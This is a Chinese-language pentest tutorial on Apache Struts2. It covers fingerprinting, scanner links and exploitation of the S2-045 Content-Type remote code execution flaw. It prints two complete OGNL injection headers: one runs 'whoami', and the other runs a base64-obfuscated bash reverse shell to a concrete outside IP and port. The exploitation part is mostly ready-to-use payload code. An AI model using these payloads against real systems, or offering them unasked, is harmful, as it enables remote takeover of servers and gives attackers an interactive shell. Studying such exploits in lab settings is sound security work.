#### 一、简介

Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。 它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。 Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。

<br/>

#### 二、历史漏洞

<br/>

##### １）历史漏洞原理分析

`https://tttang.com/archive/1583/`

`https://su18.org/post/struts2-5/`

2）漏洞搭建

vulhub：`https://github.com/vulhub/vulhub/tree/master/struts2`

<br/>

#### 三、漏洞发现

<br/>

##### 1）Struts2框架识别

- 通过网页后缀来进行判断，如.do或者.action
- 通过/struts/webconsole.html是否存在来进行判断，需要devMode为true

<br/>

2）漏洞检测工具

Struts2-Scan：`https://github.com/HatBoy/Struts2-Scan`

s2-tool：`https://github.com/Guaang/s2-tool`

Struts2VulsTools：`https://github.com/shack2/Struts2VulsTools`

<br/>

#### 四、历史漏洞利用

<br/>

##### 1）Struts2-045 远程代码执行

在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。

影响版本范围：

`Struts 2.3.5 - Struts 2.3.31`

`Struts 2.5 - Struts 2.5.10`

<br/>

#### 2）漏洞利用

a. 随意上传一个文件并抓包

b. 修改Content-Type为以下内容

```sh
Content-Type:"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

重放请求即可执行里面包含的命令行

c. 添加反弹shell的命令

```sh
Content-Type:"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuNzEuNDUuMjgvNzg5MCAwPiYx|base64 -d|bash -i').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```